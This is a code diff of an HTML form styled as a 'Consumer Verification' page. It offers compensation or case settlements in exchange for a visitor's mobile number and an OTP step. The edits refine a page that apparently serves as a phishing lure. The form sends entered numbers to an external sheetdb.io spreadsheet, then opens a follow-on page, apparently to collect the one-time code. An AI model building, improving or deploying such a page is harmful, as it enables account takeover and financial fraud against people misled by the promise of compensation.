@@ -113,18 +113,18 @@ hr {
 }
 </style>
 <body>
-<h2> Consumer Verification </h2>
-<img src="mobil.jpeg">
+<h2> Consumers Verification </h2>
+<img src="mobil1.jpeg">
 <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">&times;</span>
  <form class="modal-content" action="https://sheetdb.io/api/v1/2d6oxymr12ubu" method="post" id="sheetdb-form" >
  <div class="container">
- <h1>Verify Your Self and claim compensation </h1>
- <p> Enter Your Mobile Number </p>
+ <h1>Verify Your Self and get Settlements on you case </h1>
+ <p> Enter Your Mobile Number and Genrate OTP </p>
  <hr>
- <label for="Mobile"><b>Mob</b></label>
- <input type="text" placeholder="Enter Mob" name="data[mob]" required>
+ <label for="Mobile"><b>Mobile Number</b></label>
+ <input type="text" placeholder="Enter Mobile Number" name="data[mob]" required>
        
-<button onclick="document.getElementById('id02').style.display='block'" style="width:auto;">Submit</button>
+<button onclick="document.getElementById('id02').style.display='block'" style="width:auto;" >Genrate OTP </button>
 
 <<script>
             var form = document.getElementById('sheetdb-form');
@@ -137,7 +137,7 @@ hr {
               response => response.json()
           ).then((html) => {
             // you can put any JS code here
-            window.open('Verify.html', '_blank');
+            window.open('id02.html', '_blank');
 
           });
         });
